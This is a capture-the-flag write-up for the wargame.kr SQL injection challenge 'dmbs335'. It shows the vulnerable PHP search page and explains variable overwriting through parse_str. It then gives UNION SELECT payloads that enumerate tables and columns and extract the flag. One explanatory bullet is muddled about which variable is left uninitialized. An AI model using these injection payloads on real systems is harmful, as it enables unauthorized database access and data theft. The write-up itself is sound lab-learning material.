# [wargame.kr] dmbs335
```php
 <?php 

if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
}

include("./inc.php"); // Database Connected

function getOperator(&$operator) { 
    switch($operator) { 
        case 'and': 
        case '&&': 
            $operator = 'and'; 
            break; 
        case 'or': 
        case '||': 
            $operator = 'or'; 
            break; 
        default: 
            $operator = 'or'; 
            break; 
}} 

if(preg_match('/session/isUD',$_SERVER['QUERY_STRING'])) {
    exit('not allowed');
}

parse_str($_SERVER['QUERY_STRING']); 
getOperator($operator); 
$keyword = addslashes($keyword);
$where_clause = ''; 

if(!isset($search_cols)) { 
    $search_cols = 'subject|content'; 
} 

$cols = explode('|',$search_cols); 

foreach($cols as $col) { 
    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
    if($col) { 
        $query_parts = $col . " like '%" . $keyword . "%'"; 
    } 

    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    } 
} 

if(!$where_clause) { 
    $where_clause = "content like '%{$keyword}%'"; 
} 
if(preg_match('/\s'.$operator.'\s$/isDU',$where_clause)) { 
    $len = strlen($where_clause) - (strlen($operator) + 2);
    $where_clause = substr($where_clause, 0, $len); 
} 


?>
<style>
    td:first-child, td:last-child {text-align:center;}
    td {padding:3px; border:1px solid #ddd;}
    thead td {font-weight:bold; text-align:center;}
    tbody tr {cursor:pointer;}
</style>
<br />
<table border=1>
    <thead>
        <tr><td>Num</td><td>subject</td><td>content</td><td>writer</td></tr>
    </thead>
    <tbody>
        <?php
            $result = mysql_query("select * from board where {$where_clause} order by idx desc");
            while ($row = mysql_fetch_assoc($result)) {
                echo "<tr>";
                echo "<td>{$row['idx']}</td>";
                echo "<td>{$row['subject']}</td>";
                echo "<td>{$row['content']}</td>";
                echo "<td>{$row['writer']}</td>";
                echo "</tr>";
            }
        ?>
    </tbody>
    <tfoot>
        <tr><td colspan=4>
            <form method="">
                <select name="search_cols">
                    <option value="subject" selected>subject</option>
                    <option value="content">content</option>
                    <option value="content|content">subject, content</option>
                    <option value="writer">writer</option>
                </select>
                <input type="text" name="keyword" />
                <input type="radio" name="operator" value="or" checked /> or &nbsp;&nbsp;
                <input type="radio" name="operator" value="and" /> and
                <input type="submit" value="SEARCH" />
            </form>
        </td></tr>
    </tfoot>
</table>
<br />
<a href="./?view-source">view-source</a><br />

```

Vuln: 
- Use `parse_str($_SERVER['QUERY_STRING']);`, which automatically creates PHP variables from query parameters. This means an attacker can set any variable used in the script, including internal ones like query_parts.
- `search_cols` in not initialized if there is no return row 
=> We can pass in `search_cols` with url params and skip all the checks (make sure query returns 0 col so no rows is returned)

## Payload
```
?search_cols=lol&keyword=&operator=&query_parts=0 union select 6,7,6,7#
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/49ddb6ccd610fbe28840920d1eb27a2cf259b80d1b5d44b5f110b4889e58ba3c.png)

Fetch all tables:
```
?search_cols=lol&keyword=&operator=&query_parts=0 union select 6,7,table_name,7 from information_schema.tables#
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/b85df7b4c64b16c7394b8b9aa2a522eef87c2098ebf56f1fd0d938607c0097b0.png)

Find flag column:
```
?search_cols=lol&keyword=&operator=&query_parts=0 union select 6,7,column_name,7 from information_schema.columns#
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/3c8cce0ea79fef3c586596cebb24f25d622daa302bf31fbc97a343f70ff3a5f3.png)

Get flag:
```
?search_cols=lol&keyword=&operator=&query_parts=0 union select 6,7,f1ag,7 from Th1s_1s_Flag_tbl#
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/27af6f6d60d27fa94cb44dcb1d51fc9d76cf4ad9b763932b19bc0aba10ce5d3e.png)
